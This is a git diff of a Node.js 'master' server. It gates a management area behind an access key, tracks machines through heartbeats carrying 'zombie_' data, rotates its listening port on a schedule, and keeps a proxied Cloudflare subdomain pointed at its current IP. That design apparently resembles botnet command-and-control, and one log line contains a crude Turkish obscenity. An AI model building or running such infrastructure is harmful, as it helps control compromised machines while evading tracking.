@@ -74,20 +74,30 @@ server.use((req, res, next) => {
 })
 
 app.use((req, res, next) => {
-    let area = ((req.originalUrl).split("/")[1]);
-    if (area === "mgmt") {
-        if ((req.headers.accesskey)) {
-            if ((config.pk).includes(req.headers.accesskey)) {
-                //console.log("approve");
-                next()
+    if (initiated) {
+        let area = ((req.originalUrl).split("/")[1]);
+        if (area === "mgmt") {
+            if ((req.headers.accesskey)) {
+                if ((config.pk).includes(req.headers.accesskey)) {
+                    //console.log("approve");
+                    next()
+                } else {
+                    res.send(403)
+                }
             } else {
                 res.send(403)
             }
         } else {
-            res.send(403)
+            next()
         }
-    } else {
-        next()
+    }
+    else {
+        res.send(500, {
+            error: {
+                message: "MASTER_IS_INITIATING",
+                innerResponse: `The master had initiated at ${initSign}`
+            }
+        })
     }
 })
 
@@ -99,22 +109,22 @@ server.use(middlewares)
 server.use(router)
 server.listen(3000, () => {
     //console.log('JSON Server is running')
-    axios.get("http://localhost:3000/global", {timeout: 4000})
-    .then(res => {
-        GLOBALS = res.data
-        dbok.emit('true')
-    })
-    .catch(err => {
-        dbok.emit('true')
-        GLOBALS = GLOBALS
-    })
-    initiate()
+    axios.get("http://localhost:3000/global", { timeout: 4000 })
+        .then(res => {
+            GLOBALS = res.data
+            dbok.emit('true')
+        })
+        .catch(err => {
+            dbok.emit('true')
+            GLOBALS = GLOBALS
+        })
 })
 
 dbok.on('true', () => {
     if (!initiated) {
         logger.init(initSign, "Database started.")
     } else {
+        initiate()
         logger.info(logID(), "Database started", "Database started.")
     }
     //console.log('started')
@@ -126,6 +136,7 @@ dbok.on('false', () => {
         logger.init(initSign, "Database couldn't start.")
     } else {
         logger.error(logID(), "Database error", "Database error.")
+        process.exit(0)
     }
 })
 
@@ -281,18 +292,18 @@ app.post('/heartbeat', (req, res) => {
         let currentMachineData = currentMachineData_.zombie_
         currentMachineData.id = ip
         axios.patch(`http://localhost:3000/machines/${ip}`, currentMachineData)
-        .then(res => {
-            res.send(200)
-        })
-        .catch(err => {
-            console.error(err);
-            res.send(500, {
-                error: {
-                    message: "DATABASE_ERR",
-                    innerResponse: err.message
-                }
+            .then(res => {
+                res.send(200)
             })
-        })
+            .catch(err => {
+                console.error(err);
+                res.send(500, {
+                    error: {
+                        message: "DATABASE_ERR",
+                        innerResponse: err.message
+                    }
+                })
+            })
     }
     res.send(200, "OKAY")
 })
@@ -600,6 +611,113 @@ function initiate() {
             globalLock = false;
         })
     updateMasterSubdomain()
+    function checkSelf() {
+        globalLock = true;
+        axios.get("http://localhost:3000/global")
+            .then(res => {
+                adaptPort()
+                globalLock = false;
+
+            })
+            .catch(err => {
+                globalLock = false;
+            })
+    }
+    async function adaptPort() {
+        console.log("attempting");
+        if (GLOBALS.port.changeAt <= Date.now()) {
+            console.log("GEÇMİŞ AMINA KOYAYIM")
+            console.log(JSON.stringify(GLOBALS));
+            console.log(GLOBALS.port);
+            GLOBALS.port.last = GLOBALS.port.number
+            console.log(JSON.stringify(GLOBALS));
+            GLOBALS.port.number = GLOBALS.port.changeTo
+            console.log(JSON.stringify(GLOBALS));
+            CURRENTPORT = GLOBALS.port.changeTo
+            console.log(JSON.stringify(GLOBALS));
+            GLOBALS.port.changedLast = Date.now()
+            console.log(JSON.stringify(GLOBALS));
+            axios.patch("http://localhost:3000/global", GLOBALS)
+                .then(res => {
+                    refreshGlobals()
+                    schedulePortChange()
+                    console.log("repl");
+                    console.log(GLOBALS);
+                    globalLock = false;
+                })
+                .catch(err => {
+                    dbok.emit('false')
+                    console.log(err);
+                    globalLock = false;
+                })
+        }
+    }
+    checkSelf();
+    refreshGlobals()
+
+    setInterval(function () {
+        checkSelf()
+        console.log("Self-check...");
+    }, 10000)
+
+    setInterval(function () {
+        refreshGlobals()
+    }, 5000)
+
+    function refreshGlobals() {
+        if (globalLock === false) {
+            axios.get("http://localhost:3000/global")
+                .then(res => {
+                    GLOBALS = res.data
+                })
+                .catch(err => {
+                    GLOBALS = GLOBALS
+                })
+        }
+    }
+
+    function updateMasterSubdomain() {
+        let traceid = logID()
+        logger.info(traceid, "Updating Master Subdomain", `Begun`)
+        axios.get("http://icanhazip.com")
+            .then(res => {
+                console.log(res.data)
+                let currentIP = res.data
+                logger.info(traceid, "Updating Master Subdomain", `Current IP recieved as ${currentIP}`)
+                var options = {
+                    method: 'PUT',
+                    url: `https://api.cloudflare.com/client/v4/zones/${dotenv.CFZI}/dns_records/${dotenv.CFDR}`,
+                    headers: {
+                        Authorization: 'Bearer ' + dotenv.CFPT,
+                        'Content-Type': 'application/json'
+                    },
+                    data: {
+                        type: 'A',
+                        name: 'master.api.canavar.licentia.xyz',
+                        content: currentIP,
+                        ttl: 1,
+                        proxied: true
+                    }
+                };
+                axios.request(options).then(function (response) {
+                    console.log(response.data);
+                    logger.info(traceid, "Updated Master Subdomain", `Updated the subdomain to IP ${currentIP}`)
+                }).catch(function (error) {
+                    logger.info(traceid, "Couldn't Update Master Subdomain", `Tried to update the subdomain to IP ${currentIP}`)
+                    console.error(error);
+                });
+            })
+            .catch(err => {
+                console.error(err);
+                logger.info(traceid, "Couldn't Update Master Subdomain", `Error was : ${err}`)
+            })
+
+    }
+
+    setInterval(function () {
+        activeMachinesList = []
+        updateMasterSubdomain()
+    }, 60000)
 }
 
 async function changePort(newport, logid) {
@@ -650,110 +768,3 @@ async function clock() {
     }
 }
 
-function checkSelf() {
-    globalLock = true;
-    axios.get("http://localhost:3000/global")
-        .then(res => {
-            adaptPort()
-            globalLock = false;
-
-        })
-        .catch(err => {
-            globalLock = false;
-        })
-}
-async function adaptPort() {
-    console.log("attempting");
-    if (GLOBALS.port.changeAt <= Date.now()) {
-        console.log("GEÇMİŞ AMINA KOYAYIM")
-        console.log(JSON.stringify(GLOBALS));
-        console.log(GLOBALS.port);
-        GLOBALS.port.last = GLOBALS.port.number
-        console.log(JSON.stringify(GLOBALS));
-        GLOBALS.port.number = GLOBALS.port.changeTo
-        console.log(JSON.stringify(GLOBALS));
-        CURRENTPORT = GLOBALS.port.changeTo
-        console.log(JSON.stringify(GLOBALS));
-        GLOBALS.port.changedLast = Date.now()
-        console.log(JSON.stringify(GLOBALS));
-        axios.patch("http://localhost:3000/global", GLOBALS)
-            .then(res => {
-                refreshGlobals()
-                schedulePortChange()
-                console.log("repl");
-                console.log(GLOBALS);
-                globalLock = false;
-            })
-            .catch(err => {
-                dbok.emit('false')
-                console.log(err);
-                globalLock = false;
-            })
-    }
-}
-checkSelf();
-refreshGlobals()
-
-setInterval(function () {
-    checkSelf()
-    console.log("Self-check...");
-}, 10000)
-
-setInterval(function () {
-    refreshGlobals()
-}, 5000)
-
-function refreshGlobals() {
-    if (globalLock === false) {
-        axios.get("http://localhost:3000/global")
-            .then(res => {
-                GLOBALS = res.data
-            })
-            .catch(err => {
-                GLOBALS = GLOBALS
-            })
-    }
-}
-
-function updateMasterSubdomain() {
-    let traceid = logID()
-    logger.info(traceid, "Updating Master Subdomain", `Begun`)
-    axios.get("http://icanhazip.com")
-        .then(res => {
-            console.log(res.data)
-            let currentIP = res.data
-            logger.info(traceid, "Updating Master Subdomain", `Current IP recieved as ${currentIP}`)
-            var options = {
-                method: 'PUT',
-                url: `https://api.cloudflare.com/client/v4/zones/${dotenv.CFZI}/dns_records/${dotenv.CFDR}`,
-                headers: {
-                    Authorization: 'Bearer ' + dotenv.CFPT,
-                    'Content-Type': 'application/json'
-                },
-                data: {
-                    type: 'A',
-                    name: 'master.api.canavar.licentia.xyz',
-                    content: currentIP,
-                    ttl: 1,
-                    proxied: true
-                }
-            };
-            axios.request(options).then(function (response) {
-                console.log(response.data);
-                logger.info(traceid, "Updated Master Subdomain", `Updated the subdomain to IP ${currentIP}`)
-            }).catch(function (error) {
-                logger.info(traceid, "Couldn't Update Master Subdomain", `Tried to update the subdomain to IP ${currentIP}`)
-                console.error(error);
-            });
-        })
-        .catch(err => {
-            console.error(err);
-            logger.info(traceid, "Couldn't Update Master Subdomain", `Error was : ${err}`)
-        })
-
-}
-
-setInterval(function () {
-    activeMachinesList = []
-    updateMasterSubdomain()
-}, 60000)
